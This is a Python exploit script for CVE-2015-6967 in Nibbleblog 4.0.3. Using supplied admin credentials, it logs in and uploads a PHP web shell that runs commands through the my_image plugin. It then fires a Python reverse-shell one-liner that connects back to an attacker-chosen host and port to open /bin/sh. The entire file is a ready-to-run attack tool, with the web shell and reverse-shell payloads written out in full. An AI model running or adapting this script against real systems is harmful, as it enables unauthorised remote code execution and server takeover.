# -*- coding:utf-8 -*-

# Nibbleblog 4.0.3 Shell Upload Exploit
# CVE: 2015-6967
# Exploit author: Curesec Research Team
# https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html
# Python script exploit author: nullarmor <nullarmor@protonmail.com>

import argparse
import os
import requests
import sys
from time import sleep

def main():
    
    # args
    argparser = argparse.ArgumentParser(description='Nibbleblog 4.0.3 Shell Upload Exploit', 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', action='store_true')
    
    main_arg.add_argument('--rhost', type=str,
                            help='Nibbleblog host', required=True)
    
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
                                                    
    main_arg.add_argument('--login', type=str,
                            help='Nibbleblog login', required=True)
    
    main_arg.add_argument('--password', type=str,
                            help='Nibbles password', required=True)
    
    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable burpsuite proxy')
    
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
    
    # cons
    lhost = args.lhost
    lport = args.lport
    rhost = "http://" + args.rhost.replace('/', '')
    nibbleblog_login = args.login
    nibbleblog_password = args.password
    url_login = '{}/nibbleblog/admin.php'.format(rhost)
    url_upload = '{}/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image'.format(rhost)
    url_webshell = '{}/nibbleblog/content/private/plugins/my_image/image.php?cmd=id'.format(rhost)
    burpsuite = args.burpsuite
    
    # req
    session = requests.Session()
    
    def login():
        
        post = {
            "username": nibbleblog_login,
            "password": nibbleblog_password
        }
        
        print(" [*] Sign-in using credentials...")
        
        try:
            r = session.post(url_login, data=post)
        except Exception as e:
            print(e)
        else:
            if "dashboard" in r.url:
                print(" [*] Logged with success!")
            else:
                print(" [*] Failed to login with provided Nibbleblog credentials")
                sys.exit(1)
        
    def exploit():
        
        with open('tmp_webshell.php','w') as f:
            f.write('<?php system($_GET["cmd"]) ?>')
            f.close()
    
        proxies = { "http": "127.0.0.1:8080" }
    
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
        }
        
        files = {
            "image":( "tmp_webshell.php", 
                      open( "tmp_webshell.php" ,"rb"), 
                      "application/x-php")
        }
        
        multipart_form_data = {
                'controller': 'plugins',
                'plugin': 'my_image',
                'position': '4',
                'title': 'My image',
                'action': 'config',
                'caption': '',
                'image_resize': '1',
                'image_width': '230',
                'image_height': '200',
                'image_option': 'auto'
        }
        
        try:
            if burpsuite:
                r = session.post(url_upload, data=multipart_form_data, 
                                 headers=headers, files=files, proxies=proxies)
            else:
                r = session.post(url_upload, data=multipart_form_data, 
                                 headers=headers, files=files)
                
        except Exception as e:
            print(e)
        else:
            if 'successfully' in r.text:
                print(" [*] Web shell successfully uploaded, check at: {}".format(url_webshell))
                print(" [*] Cleaning temporary web shell...")
                os.remove("tmp_webshell.php")
                print(" [*] Setting up reverse shell using LHOST {} and LPORT {} ...".format(lhost, lport))
                rshell_payload = """;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' """.format(lhost, lport)
                print(" [*] In 10 seconds a connection will be received, run on a new terminal: nc -lvp {} and wait :)".format(lport))
                sleep(10)
                print(" [*] Reverse shell connection spawned!")
                
                try:
                    r = requests.get("{}{}".format(url_webshell, rshell_payload))
                except Exception as e:
                    print(e)
                    
            else:
                print("[*] Failed to upload web shell :(")
                sys.exit(1)
    
    # main
    print(" [>] Nibbleblog 4.0.3 Shell Upload Exploit")
    print(" [*] Exploit author: Curesec Research Team")
    print(" [*] Python script exploit author: nullarmor")
    
    login()
    exploit()   
       
if __name__ == "__main__":
    main()
